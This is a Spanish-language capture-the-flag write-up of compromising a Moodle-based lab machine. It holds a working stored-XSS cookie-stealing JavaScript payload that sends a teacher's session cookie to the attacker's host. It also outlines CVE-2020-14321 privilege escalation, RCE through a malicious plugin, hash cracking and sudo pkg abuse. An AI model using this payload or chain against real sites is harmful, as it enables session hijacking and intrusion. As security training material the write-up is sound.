----------
- Tags: #xss #vhost #xss-stored #stealing-cookie #CVE-2020-14321 #mass-assignment-attack #password-crack #sudoers-pkg
----
## Técnicas utilizadas
- VHost Brute Force  
- Moodle Enumeration  
- Moodle - Stored XSS  
- Stealing a teacher's session cookie  
- Privilege escalation from teacher role into manager role to RCE [CVE-2020-14321]  
- Elevating our privilege to Manager in Moodle - User Impersonation  
- Mass Assignment Attack - Enable Full Permissions  
- Giving us the ability to install a plugin  
- Achieving remote command execution through installation of a malicious Plugin  
- Enumerating the database once we have gained access to the system  
- Cracking Hashes  
- Abusing sudoers privilege (pkg install package) [Privilege Escalation]
## Procedimientos

![[Pasted image 20230626171531.png]]

#### Reconocimiento 

Si lanzamos un **nmap** contra la maquina, podremos ver los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,80,3306 10.10.10.234 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 09:22 MST
Nmap scan report for 10.10.10.234
Host is up (0.13s latency).

PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d698378fc91f819c875a71e764505dc (RSA)
|   256 e9b2d2239dcf0e63e06db9b1a6869338 (ECDSA)
|_  256 7f5188f73cdd775eba254d4c0925ea1f (ED25519)
80/tcp   open   http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Schooled - A new kind of educational institute
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
3306/tcp closed mysql
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds
```

Un reconocimiento de tecnologías web con **whatweb** nos da el siguiente input:
```ruby
# whatweb 10.10.10.234
http://10.10.10.234 [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 (FreeBSD) PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE=edge]
```

-----------------
#### VHost Brute Force  

Podemos ejecutar una ataque de fuerza bruta con **gobuster** para enumerar subdominios dispobles para el dominio. Encontramos uno:
![[Pasted image 20230627093429.png]]

Este subdominio nos lleva a **Moodle**, según google **Moodle** es:

	Moodle es un sistema de gestión de aprendizaje, gratuito y de código abierto escrito en PHP​​ y distribuido bajo la Licencia Pública General GNU.​ ​

--------
#### Moodle Enumeration  
Tenemos la capacidad de crear una cuenta como alumno, asi que nos creamos una cuenta para poder enumerar más en profundidad el software. Podemos **unirnos** a un curso, el que deseemos, tomaremos como ejemplo el curso de matematicas y nos uniremos.

Si leemos un poco el anuncio que nos dejo el profesor, nos dice que va estar revisando cada perfil constantemente atentando contra el campo **MoodleNet Profile**:
![[Pasted image 20230627093503.png]]

---------------
#### Moodle - Stored XSS  
Si intentamos colarle un **XSS** al campo, vemos que si es vulnerable y se queda almacenado, a eso se le conoce como **XSS Stored**. Si intentamos cargar un script desde nuestro lado y esperamos a ver si entra algún profesor, veremos se nos tramita una petición por **GET**:
```python
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.234 - - [27/Jun/2023 09:31:16] code 404, message File not found
10.10.10.234 - - [27/Jun/2023 09:31:16] "GET /pwned.js HTTP/1.1" 404 -
```

-----------
#### Stealing a teacher's session cookie 
Podemos intentar secuestrar la cookie del profesor a través del **XSS Stored** con el siguiente script en **js**:
```javascript

var req1 = new XMLHttpRequest();
cookie = document.cookie;
req1.open("GET", "http://<my-ip>/cookie?=" + cookie, true);
req1.send()
```

Una vez con la cookie en nuestra disposición, podemos cambiarla para estar como el usuario engañado.

--------------
#### Privilege escalation from teacher role into manager role to RCE [CVE-2020-14321]  
##### Elevating our privilege to Manager in Moodle - User Impersonation  
Una vez como el profesor, podemos ir al curso que tenemos creado e ir a inspeccionar a los alumnos. En esta sección tenemos una opcion de nombre **Enrol Users**, tenemos que acceder a ella:
![[Pasted image 20230627093920.png]]

Intentamos añadir a la usuario **Lian Carter** por poner un ejemplo. Pasamos la petición por **BurSuite** y vamos a cambiar los valores de los atributos: **User List** y **Role To assign** de la siguiente manera:
![[Pasted image 20230627093858.png]]

Esto nos permitira conectarnos como la persona que se nos apetezca.

--------
#### Mass Assignment Attack - Enable Full Permissions
Ahora como podemos acceder al **moodle** con el usuario que cuenta con privilegios de **manager**, se nos desbloquea una nueva configuracion:
![[Pasted image 20230627094656.png]]

Lo siguiente a tener en cuenta, es intentar subir un plugin, que de primeras no deberiamos de poder subirlo ya que no nos aparece la opcion:
![[Pasted image 20230627094727.png]]

Para poder lograr subirlo, tendremos que asigarnos todos los permisos a **ON**, esto lo lograremos con un **Mass Assigment Attack**, podemos copiar todo la data integra a mandar del repositorio [HoangKien1020](https://github.com/HoangKien1020/CVE-2020-14321) y con esto tendremos todos los permisos habilitados. Esto se gestiona desde los roles:
![[Pasted image 20230627094851.png]]

La petición en **BurpSuite** se veria algo como esto:
![[Pasted image 20230627095232.png]]

-------
#### Giving us the ability to install a plugin  

Con todos los permisos habilitados, tenemos la capacidad de subir **plugins**. Subiremos el plugin que viene contemplado en el repositorio de [HoangKien1020](https://github.com/HoangKien1020/CVE-2020-14321) en este también nos indican la ruta a la que podemos atentar para la ejecución remota de comandos.

----------------
#### Achieving remote command execution through installation of a malicious Plugin
Si intentmamos ejecutar comandos, el output se veria tal que asi:
![[Pasted image 20230627100201.png]]
e
-----------
#### Enumerating the database once we have gained access to the system
Dentro de la maquina, podemos listar el archivo **Config.php** de **Moodle** ya que estos suelen contener credenciales a la base de datos. Podemos intentar conectarnos a la **Base de datos** para enumarla e intentar sacar la información más relevante.

------
#### Cracking Hashes 
De la base de datos podemos recopilar unos hashes de algunos usuarios los cuales podemos tratar de romper con **John**.

------
#### Abusing sudoers privilege (pkg install package) [Privilege Escalation]
Vemos que tenemos de privilegio de sudoers el **pkg**. Podemos tirar de **GTFObins** para escalar privilegios.

